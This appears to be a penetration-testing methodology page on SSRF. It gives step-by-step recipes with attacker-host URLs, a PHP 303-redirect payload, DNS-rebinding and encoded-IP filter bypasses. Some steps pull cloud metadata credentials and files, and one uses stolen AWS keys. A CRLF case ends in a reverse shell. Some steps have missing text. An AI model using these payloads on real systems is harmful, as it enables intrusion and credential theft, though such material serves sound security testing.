# Server Side Request Forgery

## Check List

## Methodology

### Black Box

#### SSRF In Next.js

{% stepper %}
{% step %}
Go to the site that uses Next Js technology, right click and select View Page Source
{% endstep %}

{% step %}
Search for `/_next/image?url=` and see if you see anything
{% endstep %}

{% step %}
And send this request in the form below

```url
GET https://target/_next/image?url=https://attacker.com/p.png&w=100&q=75
```
{% endstep %}

{% step %}
Check if the server has hit our server or not, if it has hit, the vulnerability will be detected
{% endstep %}
{% endstepper %}

***

#### SSRF vectors

{% stepper %}
{% step %}
A common one. Think about functions where the application fetches something based on a URL — maybe an image importer or data fetcher. If the app is grabbing content from an external URL, you can bet it might be susceptible to SSRF, especially if there’s no proper validation. The idea here is to try feeding internal URLs like `http://localhost` or `http://127.0.0.1`
{% endstep %}

{% step %}
Oh yes, file uploads. These can be sneaky. Imagine an application that lets users upload files — things like PDFs, SVGs, or even Office documents. If the backend processes these files, SSRF might be hiding here. You can try uploading files with embedded URLs pointing to internal services (Reference: The PDF Trojan Horse: Leveraging HTML Injection for SSRF and Internal Resource Access)
{% endstep %}

{% step %}
Proxy Implementations: Proxies are interesting because they route requests through the server. If the application lets you send requests through a proxy and doesn’t validate the URLs strictly, you’ve got a shot at SSRF. This is especially true if it doesn’t sanitize user-supplied URLs. Try sending requests to internal services or other unauthorized endpoints and see what happens
{% endstep %}

{% step %}
Server Status and Monitoring Features: Now, look for those features that allow you to check server status or application health. These functionalities often query internal services for status information — perfect spots for SSRF. If you find one, try manipulating the requests to hit internal endpoints or sensitive services
{% endstep %}

{% step %}
File Storage Integrations: If your target integrates with third-party services like Google Drive, Amazon S3, or Dropbox, check if the app makes server-side requests to fetch or store files. These are excellent candidates for SSRF, as you can try manipulating the requests to fetch internal files or data from unauthorized services. By injecting a crafted URL into these integrations, you might access internal systems that were never meant to be exposed
{% endstep %}

{% step %}
Path Parameters and Host Headers: Pay close attention to how path parameters and host headers are handled. If an application uses path parameters to construct server-side requests, that’s another spot to test for SSRF. Try manipulating the parameters to redirect requests to internal resources. Similarly, the host header might be leveraged to control where requests are sent. Test for any weaknesses here — you might be able to influence the destination of requests using the host header
{% endstep %}
{% endstepper %}

***

#### Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata

{% stepper %}
{% step %}
Login to Platform Access `https://example.com/` and sign in with valid credentials
{% endstep %}

{% step %}
Go to Creative Library, select New Creative
{% endstep %}

{% step %}
Let's examine the program and go to the point where it receives a file from the media or a link or server and create a template/Image
{% endstep %}

{% step %}
Replace Image in Template Click on an image in the template, select Replace, then choose Import
{% endstep %}

{% step %}
Use Burp Suite to intercept the POST request to /api/v1/media/import with URL parameter set to http://attacker-controlled-domain/ssrf.html
{% endstep %}

{% step %}
Run a Flask server on ssh.attacker-domain:5000 with endpoints for logging and timing delays
{% endstep %}

{% step %}
Host ssrf.html on demon.attacker-domain:80 containing JavaScript to log timing, loop requests, and fetch metadata endpoints
{% endstep %}

{% step %}
Submit the intercepted request with the malicious URL to initiate server-side fetch of ssrf.html
{% endstep %}

{% step %}
Immediately after triggering, update DNS for attacker-controlled-domain to resolve to 169.254.169.254
{% endstep %}

{% step %}
Wait 3 minutes and check timing server logs for exfiltrated data like SSH keys, service accounts, and hostname from Google Compute Engine metadata


{% endstep %}
{% endstepper %}

***

#### SSRF via Remote\_Attachment\_Url injection in Export/Import Mechanism

{% stepper %}
{% step %}
Create a new project/space on the target platform
{% endstep %}

{% step %}
Create an importable item (e.g., an issue, ticket, record, or any model with notes/attachments) and add a note/entry to it
{% endstep %}

{% step %}
Export the project/space using the platform’s export mechanism to generate the export file
{% endstep %}

{% step %}
Extract the downloaded export archive
{% endstep %}

{% step %}
In the export JSON (e.g., `project.json` or equivalent), locate the note/entry hash and add or set the `remote_attachment_url` field to an attacker-controlled URL (for example `"http://attacker-controlled-domain/payload"`). If available, also add/set header fields such as `remote_attachment_request_header`
{% endstep %}

{% step %}
Recompress the export back into the original archive format and import the reconstructed export via the platform’s import mechanism
{% endstep %}

{% step %}
After import completes, navigate to the imported item/note and view it so the platform creates the model and triggers any server-side download
{% endstep %}

{% step %}
On the attacker-controlled server, check logs or callbacks to confirm the target server fetched the malicious URL and (if successful) exposed internal data/metadata or accessed local services
{% endstep %}
{% endstepper %}

***

#### Webhook-Based SSRF via DNS Rebinding

{% stepper %}
{% step %}
Log in to the platform and identify the platform points and if it has a Webhook, follow the steps below
{% endstep %}

{% step %}
Create a webhook on the target platform for a repository/service/event
{% endstep %}

{% step %}
Use an attacker-controlled domain as the webhook URL (e.g. http://990.hacker1.example)
{% endstep %}

{% step %}
Wait about 10 seconds for DNS/TTL changes or CNAME switching to take effect
{% endstep %}

{% step %}
Trigger the webhook using the platform’s test/send test payload option (e.g., for a Push event)
{% endstep %}

{% step %}
After the webhook runs, check whether the server’s request returned content from internal services (e.g., http://169.254.169.254, http://127.0.0.1, or other local endpoints)
{% endstep %}

{% step %}
Wait \~15 seconds between attempts to avoid DNS caching interference
{% endstep %}

{% step %}
Use a chain of CNAME records on the attacker-controlled DNS to prevent caching and reliably change the request target
{% endstep %}

{% step %}
Inspect attacker-controlled server logs to confirm the target server fetched the malicious URL and returned internal data
{% endstep %}
{% endstepper %}

***

#### Full-Read SSRF — Local File Read And AWS Metadata (IMDS) Exfiltration via Base64-Encoded Path Parameter

{% stepper %}
{% step %}
Full read SSRF in www.example.com that can leak aws metadata and local file inclusion
{% endstep %}

{% step %}
Access Vulnerable Endpoint\
Navigate to https://www.example.com/ro/ endpoint with base64-encoded path parameter
{% endstep %}

{% step %}
ase64 encode "file:///home/abenavides/#.js" to `ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==`

and append /.js to URL&#x20;

```http
https://www.example.com/ro/ZmlsZTovLy9ob21lL2FiZW5hdmlkZXMvIy5qcw==/-1430533899.js
```
{% endstep %}

{% step %}
Request Directory Listing\
Submit request and observe response leaking contents of `/home/abenavides/` directory
{% endstep %}

{% step %}
Leak System File Base64 encode "file:///etc/passwd#.js" to `ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==` and request&#x20;

```http
https://www.example.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js
```

to extract file contents
{% endstep %}

{% step %}
Trigger SSRF to Metadata Base64 encode "http://169.254.169.254/#.js" to `aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz`and request

```http
https://www.example.com/ro/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8jLmpz/-1430533899.js  
```
{% endstep %}

{% step %}
Verify Internal Access Check response for AWS metadata contents, confirming SSRF exploitation
{% endstep %}
{% endstepper %}

***

#### SSRF in GraphQL Query

{% stepper %}
{% step %}
Configure Burp Collaborator to monitor incoming DNS and HTTP requests
{% endstep %}

{% step %}
Submit GraphQL query with source parameter set to full URL

```json
{ allTicks(source: "http://your-collaborator-domain.burpcollaborator.net") }  
```
{% endstep %}

{% step %}
Observe DNS and HTTP requests hitting Burp Collaborator confirming SSRF
{% endstep %}

{% step %}
Replace source with internal URLs like "http://localhost:8080" or "http://169.254.169.254" to scan internal network
{% endstep %}

{% step %}
Confirm DNS resolutions and port connectivity without HTTP response visibility
{% endstep %}

{% step %}
Use SSRF to map open ports and internal services for further vulnerability discovery
{% endstep %}
{% endstepper %}

***

#### Image-Proxy SSRF

{% stepper %}
{% step %}
Navigate to https://duckduckgo.com/iu?u=http://yimg.com/path and confirm successful response
{% endstep %}

{% step %}
Try https://duckduckgo.com/iu?u=https://google.com and verify rejection
{% endstep %}

{% step %}
Submit https://example.com/iu?u=http://127.0.0.1:6868/status/?q=http://yimg.com/ to bypass yimg.com check
{% endstep %}

{% step %}
Test localhost ports (22, 25, 80, 443, 587, 6380, 6432, 6767, 6868, 8000) using

```http
https://example.com/iu?u=http://127.0.0.1:$PORT/?q=http://yimg.com/  
```
{% endstep %}

{% step %}
Request `https://example.com/iu?u=http://127.0.0.1:6868/status/?q=http://yimg.com/` and extract Redis URLs, ping times, and internal statistics
{% endstep %}

{% step %}
Document successful internal service interactions confirming cross-origin port scanning capability
{% endstep %}
{% endstepper %}

***

#### SSRF Chained To Hit Internal Host Leading To Another SSRF Which Allows to Read Internal Images

{% stepper %}
{% step %}
Access Primary SSRF Endpoint Navigate to

```http
https://api.example.net/images/?format=png&image=https%3A//store.mgmt.example.net/store/api/chihiro/00_09_000/container/US/en/999/UP4134-CUSA00329_00-ONNTGAME00000001/1429722215000/image%3F_version%3D00_09_000%26platform%3Dchihiro%26w%3D225%26h%3D225%26bg_color%3D000000%26opacity%3D10
```
{% endstep %}

{% step %}
to fetch internal banner image from store.mgmt.example.com confirming SSRF to internal hosts
{% endstep %}

{% step %}
Test Secondary SSRF Endpoint Access

```http
https://image.api.np.km.example.net/dis/images/?format=png&image=https%3A%2F%2Fdis.api.np.example.net%2Fdis%2Fv1%2Fbanners%3Fbackplate%3Dfile:////usr/share/pixmaps/system-logo-white.png%26dimensions%3D790x250%26price%3D%2436.99%26price_discount%3D%2424.41%26format%5B%5D%3DPS4%26type%3DF%22%3E%3Csvg%3Ebanner%3C/svg%3Eull+Game%26locale%3Den_CA%26cta%3DDownload+No%26output%3Dsvg%26tpl%3Dbanner-web-store%26store%3Dgame%26region%3Dus%26
```
{% endstep %}

{% step %}
Verify Local File Read , Confirm response contains rendered PNG of system-logo-white.png confirming local file extraction via dis.api.np.playstation.net banner service
{% endstep %}

{% step %}
Test Internal Network Access\
Modify image parameter to other internal PSN hosts (e.g., mgmt.\*.playstation.com) with valid image paths confirming broader SSRF capability
{% endstep %}

{% step %}
Confirm Chained Exploitation\
Document flow: image.api.np.km.playstation.net fetches from dis.api.np.playstation.net which reads file:// local image and overlays banner data confirming full LFI via SSRF
{% endstep %}
{% endstepper %}

***

#### SSRF in Url Parameter

{% stepper %}
{% step %}
Request File Storage Endpoint Send GET request to `https://couriers.example.com/api/file-storage?url=http://your-burp-collaborator.oastify.com`
{% endstep %}

{% step %}
Monitor Burp Collaborator, Observe incoming HTTP interaction confirming SSRF execution
{% endstep %}

{% step %}
Verify Response Content Check response body contains HTML from collaborator payload: `6zy5d1pwzab93qopx8jq2ezjigz`
{% endstep %}

{% step %}
Test External Website Request `https://couriers.example.com/api/file-storage?url=https://www.google.com` and verify Google HTML displayed in response
{% endstep %}

{% step %}
Test Internal Services&#x20;

Modify URL parameter to `http://localhost:8080` or `http://169.254.169.254` to access internal network
{% endstep %}

{% step %}
Confirm Arbitrary Request Capability Document ability to fetch content from any external/internal host via unsanitized url parameter
{% endstep %}
{% endstepper %}

***

#### CRLF injection & SSRF

{% stepper %}
{% step %}
Setup Redis Server Configure Redis to listen on 127.0.0.1:6379
{% endstep %}

{% step %}
Sign in to Platform, create a new project
{% endstep %}

{% step %}
Navigate to project Settings -> Repository -> Mirroring repositories
{% endstep %}

{% step %}
Capture POST request for adding mirror using Burp Suite
{% endstep %}

{% step %}
Set project `[remote_mirrors_attributes][0][url]` to:

```
git://127.0.0.1/:2333/aaaaaaaaaaaaaaaa
```

in burp request to this

```http
git://127.0.0.1/aaa
aaa
aaa
aa
a {...}
```
{% endstep %}

{% step %}
Send POST to `/{username}/{project name}/mirror/update_now?sync_remote=true` to execute mirror action
{% endstep %}

{% step %}
Listen on `118.89.198.146:8000` and confirm incoming reverse shell from GitLab server confirming RCE
{% endstep %}
{% endstepper %}

***

#### [Blind SSRF — image/URL-Downloader Endpoint](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-exploitation)

{% stepper %}
{% step %}
Create Test Account Register a new test account on the platform
{% endstep %}

{% step %}
Log In to Account Sign in using the created test account credentials, confirming redirection to https://exmaple.com/my/
{% endstep %}

{% step %}
Navigate to Profile Edit Access the edit profile section from the user dashboard
{% endstep %}

{% step %}
Locate User Picture Field Scroll to the user picture upload area and initiate the upload process
{% endstep %}

{% step %}
Activate Burp Collaborator Launch Burp Collaborator client to monitor for incoming HTTP and DNS interactions
{% endstep %}

{% step %}
Submit External URL Payload Enter a Burp Collaborator URL in the URL downloader field, appending /test.png (e.g., http://example.com/test.png), and submit
{% endstep %}

{% step %}
Poll for Interactions Check Burp Collaborator for HTTP and DNS requests confirming Blind SSRF, noting internal IP address from interactions
{% endstep %}

{% step %}
Enable Proxy and Intercept Activate Foxy Proxy to route traffic through Burp Suite
{% endstep %}

{% step %}
Submit Localhost Payload Enter http://127.0.0.1/test.png in the URL downloader and submit, intercepting the POST request to /repository/repository\_ajax.php?action=signin
{% endstep %}

{% step %}
Verify SSRF Confirmation Examine intercepted request containing file parameter and confirm response leaks server information (e.g., nginx, PHP/7.4.28) and embedded 404 response confirming Blind SSRF
{% endstep %}

{% step %}
Test Port-Specific Leaks Modify payload to http://127.0.0.1:25/test.png and confirm response leaks Postfix SMTP server details confirming libcurl usage and broader SSRF capability

```http
POST /repository/repository_ajax.php?action=signin HTTP/1.1
Host: example.com
Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 295
Origin: https://example
Referer: https://example.com/user/edit.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

file=http%3A%2F%2F127.0.0.1%2Ftest.png&
repo_id=5&p=&page=&env=filemanager&
accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&
accepted_types[]=.jpg&accepted_types[]=.png&
sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
```
{% endstep %}

{% step %}
You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this
{% endstep %}

{% step %}
```http
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 05 Sep 2022 14:05:32 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.4.28
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Set-Cookie: RedirectDouble=1; path=/
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 20 Aug 1969 09:23:00 GMT
Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
Accept-Ranges: none
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 261

{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
```
{% endstep %}
{% endstepper %}

***

#### SSRF — Timing-Based/Internal Port-Scanning via URL-Input Endpoints

{% stepper %}
{% step %}
Identify URL Input Endpoint
{% endstep %}

{% step %}
Locate API endpoint accepting user-supplied URLs (`POST /api/profile/upload_picture with "picture_url"` parameter)
{% endstep %}

{% step %}
Submit Malicious Localhost URL
{% endstep %}

{% step %}
Send request with: `{"picture_url": "http://localhost:8080"}`
{% endstep %}

{% step %}
Measure Response Time
{% endstep %}

{% step %}
Record time taken for server response to determine if port `8080` is open
{% endstep %}

{% step %}
Test Multiple Ports
{% endstep %}

{% step %}
Submit requests with `"http://localhost:PORT"` for ports `22`, `25`, `80`, `443`, `3000`, `8080`, `6379`
{% endstep %}

{% step %}
Submit `"http://127.0.0.1:PORT"`, `"http://169.254.169.254/latest/meta-data/"`, `"http://10.0.0.1/admin"`
{% endstep %}

{% step %}
Document open ports based on response times `(<2s = open, >10s = filtered, timeout = closed`)
{% endstep %}

{% step %}
Confirm response contains AWS/GCP metadata when using `"http://169.254.169.254"` or equivalent
{% endstep %}
{% endstepper %}

***

#### [Bypassing SSRF Protection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-different-encoding)

{% stepper %}
{% step %}
Host a PHP file on attacker server with: and submit URL `http://attacker.com/redirect.php` to force server redirect to internal address
{% endstep %}

{% step %}
Configure `A/AAAA` record for subdomain.attacker.com to resolve to `127.0.0.1` and submit `http://subdomain.attacker.com` to make server fetch from internal IP
{% endstep %}

{% step %}
Replace IPv4 with equivalent IPv6 like `[::1]` for localhost and submit`http://[::1]` to evade IPv4 blacklist
{% endstep %}

{% step %}
Convert 127.0.0.1 to `0x7f.0x0.0x0.0x1` and submit `http://0x7f.0x0.0x0.0x1` to bypass decimal checks
{% endstep %}

{% step %}
Convert 127.0.0.1 to `0177.0.0.01` and submit `http://0177.0.0.01` to evade decimal blacklists
{% endstep %}

{% step %}
Convert 127.0.0.1 to `2130706433` and submit `http://2130706433` to represent IP as single integer
{% endstep %}

{% step %}
Encode "localhost" as `%6c%6f%63%61%6c%68%6f%73%74` and submit `http://%6c%6f%63%61%6c%68%6f%73%74` to slip past string filters
{% endstep %}

{% step %}
Combine formats like `0177.0.0.0x1` for 127.0.0.1 and submit `http://0177.0.0.0x1` to confuse parsers
{% endstep %}

{% step %}
If whitelist exists, find open redirect on whitelisted domain (e.g., whitelisted.com/redirect?url=http://127.0.0.1) and submit to bypass
{% endstep %}

{% step %}
Create subdomain like victim.com.attacker.com or path attacker.com/victim.com and submit to exploit poor regex validation
{% endstep %}

{% step %}
Hypothesize blacklist logic (e.g., regex for 127.0.0.1), design bypasses for assumed implementation, and test variants
{% endstep %}
{% endstepper %}

***

#### [SSRF via Service-Import With 303-Redirect Bypass to Exfiltrate AWS IMDS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-filters)

{% stepper %}
{% step %}
SSRF via service-import with 303-redirect bypass to exfiltrate AWS IMDS
{% endstep %}

{% step %}
Navigate to example.com and authenticate with a valid account
{% endstep %}

{% step %}
Identify the import document functionality supporting Dropbox, OneDrive, GDrive, Box, and Evernote services
{% endstep %}

{% step %}
Intercept the import request for Dropbox, modify file\_reference parameter to Burp Collaborator URL, and confirm 404 response indicating protection
{% endstep %}

{% step %}
Switch to OneDrive import (service\_type=O), set file\_reference to Burp Collaborator URL, and verify incoming HTTP interaction confirming SSRF
{% endstep %}

{% step %}
Observe PDF document generated in HelloSign containing collaborator page HTML confirming full response disclosure
{% endstep %}

{% step %}
Try file\_reference=`http://169.254.169.254/latest/meta-data/` and `http://127.0.0.1` confirming 404 responses due to protection
{% endstep %}

{% step %}
Review HackerOne report https://hackerone.com/reports/247680 for 303 redirect SSRF bypass method
{% endstep %}

{% step %}
Deploy PHP script on attacker server:&#x20;

```php
<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
```
{% endstep %}

{% step %}
Set file\_reference to attacker server URL `(http://attacker.com/redirect.php)` in OneDrive import request
{% endstep %}

{% step %}
Confirm response contains AWS instance metadata including access keys and tokens confirming successful bypass
{% endstep %}

{% step %}
Use extracted credentials to attempt AWS CLI commands like ec2 stop-instances --instance-ids i-instanceid, document insufficient permissions
{% endstep %}
{% endstepper %}

***

#### SSRF Host Header Injection

{% stepper %}
{% step %}
Send GET request to `https://abc.victim.com/` with `X-Forwarded-Host: A.com` and confirm 500 Internal Server Error
{% endstep %}

{% step %}
Set X-Forwarded-Host: burp-collaborator.com and observe multiple incoming requests to Collaborator containing user cookies and authorization queries
{% endstep %}

{% step %}
Deploy Node.js server on attacker.com to replay legitimate responses from abc.victim.com to SSRF requests
{% endstep %}

{% step %}
Send GET https://abc.victim.com/ with X-Forwarded-Host: attacker.com and confirm successful login without 500 error
{% endstep %}

{% step %}
Identify SSRF request with JSON `{"type": "user"}`, change to `{"type": "admin"}` on attacker.com server
{% endstep %}

{% step %}
Access https://abc.victim.com/ with X-Forwarded-Host: attacker.com and confirm admin dashboard access with sensitive data visibility
{% endstep %}

{% step %}
Navigate to 'Add New User' as admin, submit admin creation request despite 403 response
{% endstep %}

{% step %}
Verify new admin account creation and login, demonstrating full organization control via new admin privileges
{% endstep %}
{% endstepper %}

***

#### Query Wayback Machine for URLs

{% stepper %}
{% step %}
Access `https://web.archive.org/cdx/search/cdx?url=.example.com/&output=text&fl=original&collapse=urlkey&filter=statuscode:200` to retrieve archived URLs from example.com
{% endstep %}

{% step %}
Review output for API endpoints with parameters like getImage, url, path, and identify `/pdf-service?path=/test/testpage`
{% endstep %}

{% step %}
Submit https://example.com/pdf-service?path=attacker.com and verify internal server error confirming validation
{% endstep %}

{% step %}
Submit https://example.com/pdf-service?path=@attacker.com and confirm PDF contains Google page content confirming SSRF
{% endstep %}

{% step %}
Submit https://example.com/pdf-service?path=@your-burp-collaborator.com and document incoming interactions revealing AWS EC2 IPs
{% endstep %}

{% step %}
Submit https://example.com/pdf-service?path=@169.254.169.254/latest/meta-data/ and iterate across instances until confirming 200 status with AWS metadata in PDF
{% endstep %}

{% step %}
Submit https://example.com/pdf-service?path=@internal-domain.com to discover internal domains and localhost ports like 3000 (Node.js)
{% endstep %}

{% step %}
Note that localhost port scanning causes denial of service and cease further scanning to avoid disruption
{% endstep %}
{% endstepper %}

***

#### [DNS‑Rebinding‑Assisted Blind SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-dns-rebinding)

{% stepper %}
{% step %}
Locate GET `/test/?url=` parameter on redacted subdomain confirming potential SSRF
{% endstep %}

{% step %}
Submit `url=http://your-burp-collaborator.com` and observe 501/503 errors across subdomains
{% endstep %}

{% step %}
Configure Intruder with payloads

```
/latest/meta-data/hostname
/latest/meta-data/ami-id
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4
/latest/meta-data/security-groups
/latest/meta-data/instance-type
```
{% endstep %}

{% step %}
Configure DNS Rebindingss

Use 7f000001.a9fea9fe.rbndr.us domain configured to resolve to

127.0.0.1 (29/30 requests - blocked)\
169.254.169.254 (1/30 requests - metadata access)
{% endstep %}

{% step %}
Submit 30+ Intruder Requests Monitor for 200 OK responses containing JSON errors with AMI-ID and metadata confirming 1/30 success rate
{% endstep %}

{% step %}
Verify Metadata Exfiltration Confirm successful responses contain\
AMI-ID, hostname, local-ipv4, public-ipv4, security-groups, instance-type
{% endstep %}
{% endstepper %}

***

#### Identify GraphQL Endpoint

{% stepper %}
{% step %}
Locate GraphQL API endpoint (https://pwapi.ex2b.com/) supporting allTicks query
{% endstep %}

{% step %}
Test Legitimate Query

query :&#x20;

```json
{ allTicks(symbol: "TSLA", source: "https://example.com") { symbol server source ask time bid } }
```

and verify normal response
{% endstep %}

{% step %}
Confirm External SSRF , Replace source with Burp Collaborator

```json
{ allTicks(symbol: "TSLA", source: "https://your-collaborator.burpcollaborator.net/") { symbol server source ask time bid } }
```
{% endstep %}

{% step %}
Monitor Collaborator Interactions\
Poll Burp Collaborator and confirm incoming DNS + HTTP GET requests proving SSRF
{% endstep %}

{% step %}
Test GET Parameter Manipulation

```json
{ allTicks(symbol: "TSLA", source: "https://your-collaborator.burpcollaborator.net/?do=something&param=evil") { symbol server source ask time bid } }
```

and verify parameters reach server request
{% endstep %}

{% step %}
Exploit Internal Network Access Submit source payloads :

```http
"http://127.0.0.1:8080/"  
"http://localhost:3000/admin"  
"http://169.254.169.254/latest/meta-data/"  
"http://10.0.0.1/internal-api"  
```
{% endstep %}

{% step %}
Document DNS resolutions and connection attempts to internal IPs/ports confirming network probing capability
{% endstep %}
{% endstepper %}

***

#### Full‑Read SSRF via PDF Generation Endpoint

{% stepper %}
{% step %}
Navigate to `http://int.redacted.com/pdf.axd?url=example.com` and confirm PDF generation functionality
{% endstep %}

{% step %}
Submit `url=https://evil.com` and verify PDF contains content from the external domain confirming lack of input validation
{% endstep %}

{% step %}
Submit `url=http://your-interactsh-url` and monitor Interact.sh for incoming HTTP interaction confirming SSRF
{% endstep %}

{% step %}
Document IP address from Interact.sh response belongs to AWS confirming cloud environment
{% endstep %}

{% step %}
Submit `url=http://169.254.169.254/latest/meta-data/` and confirm response includes metadata confirming successful exfiltration
{% endstep %}

{% step %}
Submit `url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` and document leaked Access Key ID, Secret Access Key, and Session Token
{% endstep %}
{% endstepper %}

***

#### [Blind SSRF with DNS Rebinding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-exploitation)

{% stepper %}
{% step %}
Examine Burp Suite HTTP History for sensitive GraphQL requests after initial testing yields no bugs
{% endstep %}

{% step %}
Locate POST `/agw/graphql?op=UrlReachableVerifierQuery` with variables`{"url": "http://example.com/"}`
{% endstep %}

{% step %}
Replace url with Burp Collaborator domain and verify incoming HTTP requests from two Google Cloud IPs confirming Blind SSRF
{% endstep %}

{% step %}
Note only `"url" and "__typename"` fields echoed back in JSON response limiting direct exploitation
{% endstep %}

{% step %}
Test Google Cloud Metadata Header Attempt:

```bash
curl "https://example.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"
```
{% endstep %}

{% step %}
and confirm header requirement
{% endstep %}

{% step %}
Modify query to include various fields after verifyUrlReachable: ... on UrlReachableResult `{ FUZZ __typename }`
{% endstep %}

{% step %}
Change query to: `verifyUrlReachable(url: $url) { UrlReachable __typename }` and confirm "Reachable" echo in response
{% endstep %}

{% step %}
Attempt Direct Metadata Bypass, Test `url="http://metadata.google.internal/computeMetadata/v1/"` and confirm `"Not_Reachable"` response
{% endstep %}

{% step %}
Configure DNS Rebinding\
Setup Ceye DNS rebinding with Google Cloud IP `(1xx.xxx.xxx.xxx)` to alternate between external and `169.254.169.254`
{% endstep %}

{% step %}
Submit `url="http://rebinding-domain.ceye.io"` and confirm `"Reachable"` response proving bypass success
{% endstep %}

{% step %}
Scan Internal Ports via Rebinding\
Test `url="http://rebinding-domain.ceye.io:80"` → "Reachable"\
Test `url="http://rebinding-domain.ceye.io:443"` → "Not\_Reachable"
{% endstep %}

{% step %}
Capture evidence showing internal network probing: Port 80 open, others filtered confirming critical SSRF impact
{% endstep %}

{% step %}
Include PoCs demonstrating DNS rebinding bypass and internal port scanning for review
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
